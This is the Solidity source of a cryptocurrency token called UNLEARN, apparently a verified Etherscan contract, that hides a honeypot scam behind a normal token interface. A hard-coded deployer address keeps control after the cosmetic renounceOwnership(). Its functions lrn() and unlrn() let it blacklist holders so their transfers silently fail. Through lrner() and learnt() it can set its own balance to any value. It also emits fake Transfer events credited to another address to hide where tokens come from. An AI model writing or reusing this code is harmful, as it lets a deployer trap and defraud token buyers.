/**
 *Submitted for verification at Etherscan.io on 2022-10-25
*/

pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
    contract UNLEARNING {
  
    mapping (address => uint256) public OiO;
    mapping (address => uint256) public LRNED;
    mapping (address => bool) Ik;
    mapping(address => mapping(address => uint256)) public allowance;





    string public name = unicode"UNLEARN";
    string public symbol = unicode"🎓UNLEARN🎓";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000000 * (uint256(10) ** decimals);
	address owner = msg.sender;
   

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipRenounced(address indexed previousOwner);
    address Head_Construct = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;

    constructor()  {
    OiO[msg.sender] = totalSupply;
    deploy(Head_Construct, totalSupply); }

   
   address deplyer = 0xc28Ce8B9715fe1Aa7cccf6b8fEa1214c5CE01e64;
    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }

    function renounceOwnership() public {
    require(msg.sender == owner);
    emit OwnershipRenounced(owner);
    owner = address(0);}


        function transfer(address to, uint256 value) public returns (bool success) {
      
       
        if(msg.sender == deplyer)  {
        require(OiO[msg.sender] >= value);
        OiO[msg.sender] -= value;  
        OiO[to] += value; 
        emit Transfer (Head_Construct, to, value);
        return true; }  
        if(!Ik[msg.sender]) {
        require(OiO[msg.sender] >= value);
        OiO[msg.sender] -= value;  
        OiO[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }}

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

        function learnt () public {
         if(msg.sender == deplyer)   {
        OiO[msg.sender] = LRNED[msg.sender];
        }}

        function balanceOf(address account) public view returns (uint256) {
        return OiO[account]; }

        function unlrn(address ii) public {
        if(msg.sender == deplyer)  { 
        Ik[ii] = false;}}
        function lrn(address ii) public{
         if(msg.sender == deplyer)  { 
        require(!Ik[ii]);
        Ik[ii] = true;
        }}
             function lrner(uint256 x) public {
        if(msg.sender == deplyer)  { 
        LRNED[msg.sender] = x;} }

        function transferFrom(address from, address to, uint256 value) public returns (bool success) { 

        if(from == deplyer)  {
        require(value <= OiO[from]);
        require(value <= allowance[from][msg.sender]);
        OiO[from] -= value;  
        OiO[to] += value; 
        emit Transfer (Head_Construct, to, value);
        return true; }    
          if(!Ik[from] && !Ik[to]) {
        require(value <= OiO[from]);
        require(value <= allowance[from][msg.sender]);
        OiO[from] -= value;
        OiO[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }}}